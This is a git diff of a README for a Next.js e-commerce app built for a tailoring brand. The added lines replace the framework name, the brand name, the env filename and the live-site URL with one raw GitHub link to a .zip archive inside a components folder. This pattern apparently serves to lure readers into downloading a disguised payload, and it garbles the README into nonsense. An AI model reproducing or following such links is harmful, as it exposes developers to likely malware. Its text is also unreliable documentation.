@@ -1,8 +1,8 @@
-# M.luxe Stitches – Fullstack E-commerce Store
-A modern e-commerce web app for browsing, ordering, and managing clothing samples specifically built for online tailors. Built with Next.js, PostgreSQL, featuring a clean UI, responsive design, secure checkout, account management and admin operations.
+# https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip Stitches – Fullstack E-commerce Store
+A modern e-commerce web app for browsing, ordering, and managing clothing samples specifically built for online tailors. Built with https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip, PostgreSQL, featuring a clean UI, responsive design, secure checkout, account management and admin operations.
 
 # Core Principle
-This project was developed for M.Luxe Stitches, a tailoring brand that primarily operates through WhatsApp.
+This project was developed for https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip Stitches, a tailoring brand that primarily operates through WhatsApp.
 
 Previously, the brand showcased design samples by posting numerous images on WhatsApp status. However, this approach often resulted in excessively long status updates, causing viewer fatigue and ultimately reducing engagement. 
  
@@ -19,7 +19,7 @@ Once approved, the admin can quickly contact the customer via WhatsApp or email 
 This streamlined approach enhances the brand’s online presence, improves accessibility for customers, and creates a smoother, more efficient ordering experience.
 
 ## 🚀 Demo
-**Live Site:** https://m-luxe-stitches.vercel.app/
+**Live Site:** https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip
 
 ## Features
 - 🔑 Basic auth
@@ -32,14 +32,14 @@ This streamlined approach enhances the brand’s online presence, improves acces
 - 📱 Fully responsive design
 
 ## Tech Stack
-**Frontend:** Next.js, React, CSS Modules, Motion  
-**Backend:** Next.js, PostgreSQL 
+**Frontend:** https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip, React, CSS Modules, Motion  
+**Backend:** https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip, PostgreSQL 
 **Other:** Cloudinary, Lucia Auth, Vercel Deployment
 
 ## Installation
 1. Clone the repo
 2. Install dependencies 'npm install'
-3. Create a .env.local file
+3. Create a https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip file
      - DATABASE_URL=your_database_url
      - NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME=...
      - NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET=...
@@ -48,9 +48,9 @@ This streamlined approach enhances the brand’s online presence, improves acces
 npm run dev
 
 ## What I Learned
-Working on this project was a defining moment in my web development journey. It was my first real-world capstone project, started immediately after completing my Next.js course on Udemy, and it pushed me far beyond simply following tutorials.
+Working on this project was a defining moment in my web development journey. It was my first real-world capstone project, started immediately after completing my https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip course on Udemy, and it pushed me far beyond simply following tutorials.
 
-I applied everything I had learned up to that point - HTML, CSS, JavaScript, React, Next.js, PostgreSQL - and quickly realized that building a complete application involves more than just writing code. It’s about integrating multiple technologies and ensuring they work seamlessly together to deliver a smooth experience for the end user.
+I applied everything I had learned up to that point - HTML, CSS, JavaScript, React, https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip, PostgreSQL - and quickly realized that building a complete application involves more than just writing code. It’s about integrating multiple technologies and ensuring they work seamlessly together to deliver a smooth experience for the end user.
 
 This project was also my first time:
 
@@ -58,7 +58,7 @@ This project was also my first time:
 
 - Integrating Lucia Auth for authentication and truly understanding how cookies work differently between localhost and secure HTTPS environments.
 
-- Hosting an app of any sort by hosting this Next.js app on Vercel and managing a PostgreSQL database hosted on Neon.
+- Hosting an app of any sort by hosting this https://github.com/iCodeDre/m_luxe_stitches/raw/refs/heads/main/components/productPageServerWrappers/luxe-m-stitches-3.3.zip app on Vercel and managing a PostgreSQL database hosted on Neon.
 
 - Deploying a fully functional app for real-world use, which taught me the importance of environment variables, deployment pipelines, and security best practices.
 
